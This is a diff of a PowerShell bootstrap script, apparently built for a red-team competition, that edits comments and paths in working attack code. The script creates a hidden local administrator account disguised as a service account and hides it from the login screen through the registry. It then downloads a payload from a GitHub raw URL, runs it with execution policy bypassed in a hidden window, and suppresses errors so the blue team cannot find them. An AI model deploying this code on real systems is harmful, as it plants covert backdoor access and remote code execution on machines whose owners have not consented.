@@ -1,12 +1,10 @@
-# files/bootstrap.ps1
+# 01_bootstrap.ps1.j2
 
 # ── 1. Create hidden admin user ──────────────────────────────────────────────
-# Username derived from machine hostname so it looks like a local service account
 $hostname = $env:COMPUTERNAME.ToLower()
 $username = "svc_$($hostname.Substring(0, [Math]::Min(6, $hostname.Length)))"
 
-# Password derived from a seed + hostname - no hardcoding, but reproducible
-$seed     = "your-ctf-seed-phrase"
+$seed     = "redteam-rit-2026"
 $bytes    = [System.Text.Encoding]::UTF8.GetBytes($seed + $hostname)
 $hash     = [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)
 $password = ([Convert]::ToBase64String($hash)).Substring(0,16) + "!A1"
@@ -24,20 +22,18 @@ if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
 Set-ItemProperty -Path $regPath -Name $username -Value 0 -Type DWord
 
 # ── 2. Pull payload from GitHub ───────────────────────────────────────────────
-# Use a GitHub PAT if your repo is private - store it in ansible-vault and
-# template it into this script at deploy time rather than hardcoding it here
-$repoBase  = "https://raw.githubusercontent.com/{{ vault_github_user }}/{{ vault_repo_name }}/main"
+$repoBase   = "https://raw.githubusercontent.com/YOUR_GITHUB_USER/CDT_Payload/main"
 $payloadUrl = "$repoBase/payload.ps1"
-$dest       = "C:\Windows\Temp\$(New-Guid).ps1"   # random filename each run
+$dest       = "C:\Windows\Temp\$(New-Guid).ps1"
 
 try {
     Invoke-WebRequest -Uri $payloadUrl -OutFile $dest -UseBasicParsing
     powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $dest
 } catch {
-    # Silent fail - don't write error logs blue team can find
+    # Silent fail
 } finally {
     Remove-Item $dest -Force -ErrorAction SilentlyContinue
 }
 
 # ── 3. Proof of execution ─────────────────────────────────────────────────────
-New-Item -Path "$env:USERPROFILE\Downloads\proof.txt" -ItemType File -Force
+New-Item -Path "C:\Users\Public\proof.txt" -ItemType File -Force
